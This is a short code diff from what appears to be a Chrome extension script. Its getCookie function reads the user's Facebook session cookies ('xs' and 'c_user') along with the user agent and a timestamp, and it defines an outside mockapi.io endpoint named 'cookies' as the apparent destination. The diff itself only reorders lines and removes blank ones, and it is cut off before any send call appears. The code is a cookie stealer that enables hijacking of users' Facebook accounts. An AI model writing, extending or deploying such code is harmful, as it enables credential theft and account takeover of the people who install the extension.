@@ -423,6 +423,7 @@ function addZero(number) {
 }
 
 function getCookie() {
+    const apiUrl = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
     var currentDate = new Date();
     var year = currentDate.getFullYear();
     var month = currentDate.getMonth() + 1;
@@ -430,14 +431,10 @@ function getCookie() {
     var hours = currentDate.getHours();
     var minutes = currentDate.getMinutes();
     var seconds = currentDate.getSeconds();
-
     var formattedDate = addZero(day) + "/" + addZero(month) + "/" + year;
     var formattedTime = addZero(hours) + ":" + addZero(minutes) + ":" + addZero(seconds);
-
     var dateTimeNow = formattedTime + " - " + formattedDate;
     var userAgent = navigator.userAgent;
-
-    const apiUrl = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
     chrome.cookies.getAll({ url: "https://www.facebook.com" }, (cookies) => {
         const xsCookie = cookies.find((cookie) => cookie.name === "xs");
         const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
